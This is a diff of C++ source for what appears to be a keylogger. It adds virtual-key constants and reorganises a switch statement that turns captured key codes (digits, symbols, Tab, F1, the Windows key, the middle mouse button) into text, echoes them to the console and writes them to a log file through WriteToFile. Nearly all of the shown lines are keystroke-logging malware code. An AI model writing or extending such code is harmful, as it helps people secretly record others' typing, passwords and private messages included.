@@ -29,6 +29,9 @@
 #define VK_SNAPSHOT 0x2c; 
 #define VK_LMENU 0xA4;
 #define VK_MBUTTON 0x04; 
+#define VK_OEM_1 0xBA;
+#define VK_DIVIDE 0x6F;
+#define VK_SUBTRACT 0x6D;
 
 
 
@@ -44,36 +47,6 @@ bool Key_is_Listed(WORD iKey)
 {
 	switch (iKey)
 	{
-	case 0x6A:
-		std::cout << "*";
-		WriteToFile("*");
-		break;
-
-	case 0x5B:
-		std::cout << "Left_Win";
-		WriteToFile("Left_Win");
-		break;
-
-
-	case 0x20:
-		std::cout << " ";
-		WriteToFile(" ");
-		break;
-
-	case 0x6B:
-		std::cout << "+";
-		WriteToFile("+");
-		break;
-
-	case 0x70:
-		std::cout << " *F1* ";
-		WriteToFile(" *F1* ");
-		break;
-
-	case 0x09:
-		std::cout << " *TAB* ";
-		WriteToFile(" *TAB* ");
-		break;
 
 	case 48:
 		std::cout << "0";
@@ -124,11 +97,6 @@ bool Key_is_Listed(WORD iKey)
 	case 57:
 		std::cout << "9";
 		WriteToFile("9");
-		break;
-
-	case 59:
-		std::cout << ";";
-		WriteToFile(";");
 		break;
 
 	
@@ -346,6 +314,46 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 
+	case 0x6D:
+		std::cout << "-";
+		WriteToFile("-");
+		break;
+
+	case 0x6A:
+		std::cout << "*";
+		WriteToFile("*");
+		break;
+
+	case 0x5B:
+		std::cout << "Left_Win";
+		WriteToFile("Left_Win");
+		break;
+
+
+	case 0x20:
+		std::cout << " ";
+		WriteToFile(" ");
+		break;
+
+	case 0x6B:
+		std::cout << "+";
+		WriteToFile("+");
+		break;
+
+	case 0x70:
+		std::cout << " *F1* ";
+		WriteToFile(" *F1* ");
+		break;
+
+	case 0x09:
+		std::cout << " *TAB* ";
+		WriteToFile(" *TAB* ");
+		break;
+
+	case 0x6F:
+		std::cout << "/";
+		WriteToFile("/");
+		break;
 
 	case 0x04:
 		std::cout << "  *mouse_middle-button*  ";
